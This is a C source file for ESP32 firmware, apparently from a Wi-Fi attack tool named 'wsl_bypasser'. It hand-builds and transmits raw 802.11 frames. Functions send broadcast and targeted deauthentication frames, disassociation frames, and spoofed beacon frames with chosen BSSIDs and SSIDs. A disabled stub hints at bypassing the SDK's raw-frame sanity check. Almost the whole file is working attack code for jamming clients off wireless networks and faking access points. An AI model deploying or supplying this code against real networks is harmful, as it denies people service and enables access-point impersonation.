#include "wsl_bypasser.h"
#include <stdint.h>
#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"

static const char *TAG = "wsl_bypasser";

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

#if 0
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}
#endif

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Raw frame TX failed! Error: %s", esp_err_to_name(err));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

void wsl_bypasser_send_beacon_frame(uint8_t *bssid, uint8_t *ssid, uint8_t ssid_length, uint8_t channel) {
    uint8_t beacon_frame[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x01, 0x04,
        0x00, 0x00
    };

    memcpy(&beacon_frame[10], bssid, 6);
    memcpy(&beacon_frame[16], bssid, 6);
    beacon_frame[37] = ssid_length;
    memcpy(&beacon_frame[38], ssid, ssid_length);

    uint16_t frame_length = 38 + ssid_length;
    beacon_frame[frame_length++] = 0x03;
    beacon_frame[frame_length++] = 0x01;
    beacon_frame[frame_length++] = channel;

    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_length, false);
}

void wsl_bypasser_send_deauth_targeted(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t deauth_frame[26];
    memcpy(deauth_frame, deauth_frame_default, 26);
    memcpy(&deauth_frame[4], client_mac, 6);
    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    wsl_bypasser_send_raw_frame(deauth_frame, 26);
}

void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t disas_frame[] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x01, 0x00
    };
    memcpy(&disas_frame[4], client_mac, 6);
    memcpy(&disas_frame[10], ap_bssid, 6);
    memcpy(&disas_frame[16], ap_bssid, 6);
    wsl_bypasser_send_raw_frame(disas_frame, sizeof(disas_frame));
}